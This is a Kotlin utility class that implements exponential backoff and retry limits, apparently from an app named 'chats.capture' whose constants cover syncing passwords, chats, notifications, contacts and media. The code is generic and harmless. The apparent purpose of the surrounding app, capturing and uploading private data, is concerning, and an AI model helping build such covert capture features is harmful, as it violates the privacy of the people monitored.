package com.chats.capture.utils

import kotlinx.coroutines.delay
import timber.log.Timber

/**
 * Manages exponential backoff retry logic with max retry limits
 */
object RetryManager {
    
    /**
     * Calculate exponential backoff delay
     * @param attempt Current attempt number (1-based)
     * @param baseDelayMs Base delay in milliseconds (default 1000ms = 1s)
     * @param maxDelayMs Maximum delay in milliseconds (default 30000ms = 30s)
     * @return Delay in milliseconds
     */
    fun calculateBackoffDelay(
        attempt: Int,
        baseDelayMs: Long = 1000L,
        maxDelayMs: Long = 30000L
    ): Long {
        val exponentialDelay = baseDelayMs * (1L shl (attempt - 1)) // 2^(attempt-1) * baseDelay
        return exponentialDelay.coerceAtMost(maxDelayMs)
    }
    
    /**
     * Suspend function that delays with exponential backoff
     */
    suspend fun delayWithBackoff(
        attempt: Int,
        baseDelayMs: Long = 1000L,
        maxDelayMs: Long = 30000L
    ) {
        val delayMs = calculateBackoffDelay(attempt, baseDelayMs, maxDelayMs)
        Timber.d("Retry attempt $attempt: waiting ${delayMs}ms before retry")
        delay(delayMs)
    }
    
    /**
     * Check if should retry based on max attempts
     * @param currentAttempts Current number of attempts
     * @param maxAttempts Maximum allowed attempts
     * @return true if should retry, false if max attempts reached
     */
    fun shouldRetry(currentAttempts: Int, maxAttempts: Int): Boolean {
        return currentAttempts < maxAttempts
    }
    
    /**
     * Max retry limits for different operations
     */
    object MaxAttempts {
        const val MEDIA_UPLOAD = 15
        const val DATA_SYNC = 10
        const val PASSWORD_SYNC = 10
        const val NOTIFICATION_SYNC = 10
        const val CHAT_SYNC = 10
        const val CONTACT_SYNC = 10
    }
}
